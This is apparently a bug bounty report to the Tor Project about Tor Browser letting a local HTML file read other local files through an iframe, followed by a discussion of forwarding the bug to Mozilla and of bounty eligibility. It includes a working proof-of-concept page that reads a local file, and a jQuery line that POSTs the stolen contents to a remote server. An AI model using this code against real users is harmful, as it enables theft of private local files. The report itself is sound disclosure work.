title: Access to local file system using javascript
vulnerability_information:
Issue : Access to local file system using javascript(slightly xss on server side ) The browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory. Steps to Reproduce : save a html file from here and open in tor browser .
Explaination : file:///home/jnsjns/Desktop/poc5.html this is my test html here. file:///home/jnsjns/Desktop/1.txt is server side local file in tor browser the private file is coming by popup (I have tested in chrome -Google ,they are safe from this ) What attacker can do ? I would have been able to post it to my server using jquery like this. //Gets data from iframe and saves it to the getdata variable getdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML //Posts to the php server located at 192.168.0.102 (local address for demo purposes) $.ajax({type: "POST", url: "http://192.168.0.102/post.php", data: {string:getdata}});} This issue may critical . Regards.
vulnerability_information_html:
Issue :

Access to local file system using javascript(slightly xss on server side )

The browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory.

Steps to Reproduce :

save a html file from here and open in tor browser .

<html>
<body>
<div id='div1'>
</div>
<script>
current_href = document.location.href
frame = document.createElement('iframe'); frame.src = current_href.replace('file:///home/jnsjns/Desktop/poc5.html', 'file:///home/jnsjns/Desktop/1.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)
setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML
alert('Your data is: ' + loot)
}, 500)
</script>
</body>
</html>

Explaination : file:///home/jnsjns/Desktop/poc5.html this is my test html here.

            file:///home/jnsjns/Desktop/1.txt is server side local file in tor browser

the private file is coming by popup (I have tested in chrome -Google ,they are safe from this )

What attacker can do ?

I would have been able to post it to my server using jquery like this.

//Gets data from iframe and saves it to the getdata variable
getdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML
//Posts to the php server located at 192.168.0.102 (local address for demo purposes)
$.ajax({type: "POST", url: "http://192.168.0.102/post.php", data: {string:getdata}});}

This issue may critical .

Regards.

activities.message: Thanks for making us aware of this problem. Have you contacted the Mozilla people? It seems the underlying problem is  a Firefox bug and if it indeed is problematic I think all the Firefox users should benefit and not just Tor Browser users.
activities.markdown_message: Thanks for making us aware of this problem. Have you contacted the Mozilla people? It seems the underlying problem is a Firefox bug and if it indeed is problematic I think all the Firefox users should benefit and not just Tor Browser users.

regards

activities.message: Yes. So what I recommend is opening a bug at https://bugzilla.mozilla.org/ (for all the other Firefox affecting issues as well). There is the option to click on a checkbox to mark this bug as a security bug. If you believe that's in order then click the box. The Firefox security team will look at these reports. You can put me in Cc if you think that would be helpful (gk [@] torproject [.] org). Let' s see what they say.
activities.markdown_message: Yes. So what I recommend is opening a bug at https://bugzilla.mozilla.org/ (for all the other Firefox affecting issues as well). There is the option to click on a checkbox to mark this bug as a security bug. If you believe that's in order then click the box. The Firefox security team will look at these reports. You can put me in Cc if you think that would be helpful (gk [@] torproject [.] org). Let' s see what they say.

activities.message:
I am not sure yet. Let's see what the Mozilla folks are saying first. The kind of bugs you reported are usually eligible for Mozilla's bug bounty program if at all. And if Mozilla is rewarding you for the things you found then, looking at our policy and your bugs, we won't be able to offer you an additional bounty.

If Mozilla thinks these bugs are unproblematic I'd like to see their reasoning first and then I'd have to think about how your bugs could fit into one of our bounty categories.
activities.markdown_message:
I am not sure yet. Let's see what the Mozilla folks are saying first. The kind of bugs you reported are usually eligible for Mozilla's bug bounty program if at all. And if Mozilla is rewarding you for the things you found then, looking at our policy and your bugs, we won't be able to offer you an additional bounty.

If Mozilla thinks these bugs are unproblematic I'd like to see their reasoning first and then I'd have to think about how your bugs could fit into one of our bounty categories.

activities.message:
@geko 

They replied .

So a local file can read another local file (and in the testcase even in the same directory).
That is what our file:/// handling has been for years, yet we have tested in authorized handling and It seems impactfull ,we will fix it soon and will let you know .

I am unable to give you report id because they made it private .

As per their report they are going to resolve .so can you close this report as resolved by giving reputation points.(as you said that according to your policy i can get reward from only firefox:(

regards.

activities.message: Okay, thanks for reporting it to Mozilla, so that all Firefox users can benefit from the fix. We leave the bounty to Mozilla's bounty program in case Mozilla thinks this is worthwhile. It does not really fit into our program which is tracking cross-domain and fingerprinting + proxy bypass issues.
activities.markdown_message: Okay, thanks for reporting it to Mozilla, so that all Firefox users can benefit from the fix. We leave the bounty to Mozilla's bounty program in case Mozilla thinks this is worthwhile. It does not really fit into our program which is tracking cross-domain and fingerprinting + proxy bypass issues.

activities.message: See my previous comment for the reasoning why this is probably not eligible for our bug bounty. I have not seen Mozilla's reasoning and analysis behind this bug, though. Thus, I might be wrong. FWIW: You can add me to your bug (with gk [@] torproject [.] org) even if it is private. If you don't want to do that it is safe to give me the bug number as this alone does not give me access to secret bugs. But it would let me ask Mozilla folks to get me added to gauge the problem for Tor Browser.
activities.markdown_message: See my previous comment for the reasoning why this is probably not eligible for our bug bounty. I have not seen Mozilla's reasoning and analysis behind this bug, though. If you don't want to do that it is safe to give me the bug number as this alone does not give me access to secret bugs. But it would let me ask Mozilla folks to get me added to gauge the problem for Tor Browser.

@geko
I suggested them to add you in cc list and they replied that either they will add you or contact Tor directly after resolving.
Thank you.

Do you have a link to a commit that contains the fix because I can't see it in Mozilla's main development repository, mozilla-central, yet.
